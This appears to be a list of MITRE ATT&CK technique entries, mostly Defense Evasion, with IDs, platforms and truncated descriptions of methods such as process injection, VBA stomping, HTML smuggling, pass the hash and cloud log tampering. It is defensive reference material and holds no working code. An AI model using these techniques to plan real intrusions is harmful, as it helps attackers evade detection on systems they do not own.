+DESCRIPTION: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Compile After Delivery
+TECHNIQUE ID: T1027.004
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe, csc.exe, or GCC/MinGW. Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: VBA Stomping
+TECHNIQUE ID: T1564.007
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data. MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application. An adversary may hide malicious VBA code by overwriting the VBA source code location wi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: BITS Jobs
+TECHNIQUE ID: T1197
+TACTIC: Defense Evasion, Persistence
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: MSBuild
+TECHNIQUE ID: T1127.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations. Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application c
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Impersonation
+TECHNIQUE ID: T1656
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Office Suite, SaaS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. In many cases of business email compromise or email fraud campaigns, adversaries use i
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Modify Cloud Compute Configurations
+TECHNIQUE ID: T1578.005
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim. For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs,
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify Cloud Logs
+TECHNIQUE ID: T1562.008
+TACTIC: Defense Evasion
+PLATFORMS: IaaS, SaaS, Office Suite, Identity Provider
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region loggin
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Hidden Window
+TECHNIQUE ID: T1564.003
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system. On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: ClickOnce
+TECHNIQUE ID: T1127.002
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application. Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install. As such, adversaries may abuse ClickOnce to proxy execution of malicious code without n
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Relocate Malware
+TECHNIQUE ID: T1070.010
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows, Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts. Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)). Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Create Cloud Instance
+TECHNIQUE ID: T1578.002
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002). Creating a new instance may also allow an adversary 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Proc Memory
+TECHNIQUE ID: T1055.009
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesyste
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Patch System Image
+TECHNIQUE ID: T1601.001
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses. Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime. To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection. The original file may be over
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Persistence
+TECHNIQUE ID: T1070.009
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)). In some instances, artifacts of persistence may also be removed once an adversary’s persistence
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Masquerade Account Name
+TECHNIQUE ID: T1036.010
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows, SaaS, IaaS, Containers, Office Suite, Identity Provider
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name. Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management. They may also give accounts generic, trustworthy names, such as “admin”, “help”, or “root.” Somet
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: HTML Smuggling
+TECHNIQUE ID: T1027.006
+TACTIC: Defense Evasion
+PLATFORMS: Windows, Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads. Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filter
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Command Obfuscation
+TECHNIQUE ID: T1027.010
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing, `^`, `+`. `$`, and `%`) to make commands difficult 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: File Deletion
+TECHNIQUE ID: T1070.004
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Template Injection
+TECHNIQUE ID: T1221
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched wh
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Access Token Manipulation
+TECHNIQUE ID: T1134
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Tok
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Software Packing
+TECHNIQUE ID: T1027.002
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, bu
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Hidden File System
+TECHNIQUE ID: T1564.005
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS. Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Email Spoofing
+TECHNIQUE ID: T1672
+TACTIC: Defense Evasion
+PLATFORMS: Office Suite, Windows, macOS, Linux
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses. In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authenticat
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Thread Local Storage
+TECHNIQUE ID: T1055.005
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Inje
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Debugger Evasion
+TECHNIQUE ID: T1622
+TACTIC: Defense Evasion, Discovery
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads. Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads. Specific checks will vary based on the target a
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Space after Filename
+TECHNIQUE ID: T1036.006
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when doub
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Pass the Hash
+TECHNIQUE ID: T1550.002
+TACTIC: Defense Evasion, Lateral Movement
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perfo
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: SyncAppvPublishingServer
+TECHNIQUE ID: T1216.002
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`. Adversaries may abuse SyncAppvPublishingServer.vbs to
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: TCC Manipulation
+TECHNIQUE ID: T1548.006
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA). When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then th
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Ptrace System Calls
+TECHNIQUE ID: T1055.008
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Dynamic API Resolution
+TECHNIQUE ID: T1027.007
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts. API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions. To avoid stat
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: ListPlanting
+TECHNIQUE ID: T1055.015
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process. List-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control. ListPlanting (a form of message-passing "shatter attack") may be performe
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Domain or Tenant Policy Modification
+TECHNIQUE ID: T1484
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows, Identity Provider
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation. Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants. With sufficient permissions, adversari
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: XSL Script Processing
+TECHNIQUE ID: T1220
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedd
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Hidden Files and Directories
+TECHNIQUE ID: T1564.001
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS). On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Create Snapshot
+TECHNIQUE ID: T1578.001
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Application Access Token
+TECHNIQUE ID: T1550.001
+TACTIC: Defense Evasion, Lateral Movement
+PLATFORMS: SaaS, Containers, IaaS, Office Suite, Identity Provider
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. O
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Cloud Accounts
+TECHNIQUE ID: T1078.004
+TACTIC: Defense Evasion, Persistence, Privilege Escalation, Initial Access
+PLATFORMS: IaaS, Identity Provider, Office Suite, SaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110)
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Environmental Keying
+TECHNIQUE ID: T1480.001
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment. Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: NTFS File Attributes
+TECHNIQUE ID: T1564.004
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Dynamic-link Library Injection
+TECHNIQUE ID: T1055.001
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). Variations of this meth
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: System Script Proxy Execution
+TECHNIQUE ID: T1216
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Compression
+TECHNIQUE ID: T1027.015
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)). In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Downgrade System Image
+TECHNIQUE ID: T1601.002
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. On embedded devices, downgrading the version typically only requires replacing the operating system file in storage. With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart. The adversary could then restart the device to implement the change immediately or they could wait until the next time the system resta
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Local Accounts
+TECHNIQUE ID: T1078.003
+TACTIC: Defense Evasion, Persistence, Privilege Escalation, Initial Access
